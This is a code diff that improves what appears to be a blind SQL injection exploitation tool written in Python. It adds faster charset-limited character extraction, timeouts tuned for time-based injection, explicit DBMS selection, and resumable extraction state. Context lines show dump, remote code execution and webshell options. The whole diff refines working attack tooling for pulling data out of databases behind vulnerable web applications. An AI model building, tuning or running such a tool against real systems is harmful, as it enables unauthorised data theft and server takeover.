@@ -303,7 +303,8 @@ def boolean_payload(ctx, cond, comment):
 # HTTP transport
 # ===========================================================================
 def parse_request_file(path, proto):
-    raw = open(path, "r", encoding="utf-8", errors="ignore").read().replace("\r\n", "\n")
+    with open(path, "r", encoding="utf-8", errors="ignore") as fh:
+        raw = fh.read().replace("\r\n", "\n")
     head, _, body = raw.partition("\n\n")
     lines = head.split("\n")
     parts = lines[0].split()
@@ -382,10 +383,12 @@ class Target:
             with self._lock:
                 self.count += 1
             start = time.time()
+            # network timeout is its own concern, but must clear a time-based sleep
+            tmo = max(getattr(self.a, "timeout", 30), self.a.sleep + 10)
             try:
                 r = self.session.request(self.method, url, data=data, headers=headers,
                                          proxies=self.proxies, verify=self.verify,
-                                         timeout=self.a.sleep + 20, allow_redirects=False)
+                                         timeout=tmo, allow_redirects=False)
                 return Resp(r.status_code, r.text or "", time.time() - start)
             except requests.exceptions.RequestException as e:
                 if attempt < attempts - 1:
@@ -407,15 +410,26 @@ class Oracle_:
     def fires(self, cond): raise NotImplementedError
 
     def char(self, query, pos):
-        # binary-search the Unicode code point; ASCII stays in the fast 0-127 band,
-        # non-ASCII auto-extends (unless --ascii) so UTF-8 data isn't silently corrupted.
         code = self.dbms.code_expr(self.dbms.substr(query, pos))
+        # fast path: known alphabet (e.g. --charset hex) -> binary-search within it only
+        cs = getattr(self.a, "charset", None)
+        if cs:
+            lo, hi = 0, len(cs) - 1
+            while lo < hi:
+                mid = (lo + hi) // 2
+                if self.fires(f"{code}>{ord(cs[mid])}"):
+                    lo = mid + 1
+                else:
+                    hi = mid
+            return cs[lo]
+        # general path: binary-search the Unicode code point; ASCII stays in the fast 0-127
+        # band, non-ASCII auto-extends (unless --ascii) so UTF-8 data isn't silently corrupted.
         lo, hi = 0, 127
         if not getattr(self.a, "ascii_only", False) and self.fires(f"{code}>127"):
             lo, hi = 128, 255                         # we know it's non-ASCII; raise the floor
             cap = self.a.max_codepoint
             while hi < cap and self.fires(f"{code}>{hi}"):
-                hi = min(hi * 8, cap)
+                hi = min(hi * 2, cap)         # gentle growth: less overshoot before binary search
         while lo < hi:
             mid = (lo + hi) // 2
             if self.fires(f"{code}>{mid}"):
@@ -592,8 +606,10 @@ def detect(target, a):
         if dbms:
             print(f"[+] DBMS fingerprint: {dbms.name}")
         else:
-            dbms = Postgres()
-            print("[!] DBMS fingerprint inconclusive -> defaulting to postgresql")
+            # no silent default: a wrong DBMS means wrong syntax -> false negatives
+            print("[!] DBMS fingerprint inconclusive. Re-run with --dbms "
+                  "<postgresql|mysql|mssql|oracle> to proceed.")
+            return None
 
     # no boolean -> try time (also identifies DBMS)
     time_ctx = None
@@ -687,11 +703,11 @@ def extract_search(oracle, a, state_path, sig, value="", length=None):
                 for fut in as_completed(futures):
                     chars[futures[fut]] = fut.result()
                     _commit()                   # incremental checkpoint as the prefix fills
-            except RequestError:
+            except Exception:                   # transport *or* logic error: don't lose progress
                 for f in futures:
                     f.cancel()
                 _commit()                       # persist whatever contiguous prefix we have
-                raise                           # handled at top level; resume picks up here
+                raise                           # re-raise: transient -> retry; bug -> surfaced
         return value
 
     print(f"[*] extracting: {value}", end="", flush=True)
@@ -901,7 +917,8 @@ def job_signature(a, det, target):
 
 def load_state(path, sig):
     try:
-        d = json.load(open(path))
+        with open(path) as fh:
+            d = json.load(fh)
         if d.get("sig") == sig:
             return d
     except Exception:
@@ -966,6 +983,10 @@ def main():
     tun.add_argument("--maxlen", type=int, default=4096, help="max value length / length-probe cap")
     tun.add_argument("--ascii", dest="ascii_only", action="store_true",
                      help="ASCII-only target: skip the Unicode probe (1 fewer request/char)")
+    tun.add_argument("--charset", help="restrict extraction to a known alphabet for speed: "
+                     "a preset (hex, HEX, digits, alnum) or a literal set of characters")
+    tun.add_argument("--timeout", type=float, default=30.0,
+                     help="HTTP timeout seconds (auto-raised above --sleep for time-based)")
     tun.add_argument("--proxy")
     tun.add_argument("--insecure", action="store_true", help="skip TLS verification (and silence its warning)")
 
@@ -981,6 +1002,11 @@ def main():
     actions = sum(x for x in (a.query is not None, a.dump is not None, a.rce is not None, a.webshell))
     if actions > 1:
         ap.error("choose only one of --query / --dump / --rce / --webshell")
+    if a.charset:                       # resolve preset/custom -> sorted unique alphabet
+        presets = {"hex": "0123456789abcdef", "HEX": "0123456789ABCDEF",
+                   "digits": "0123456789",
+                   "alnum": "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"}
+        a.charset = "".join(sorted(set(presets.get(a.charset, a.charset))))
 
     target = Target(a)
 
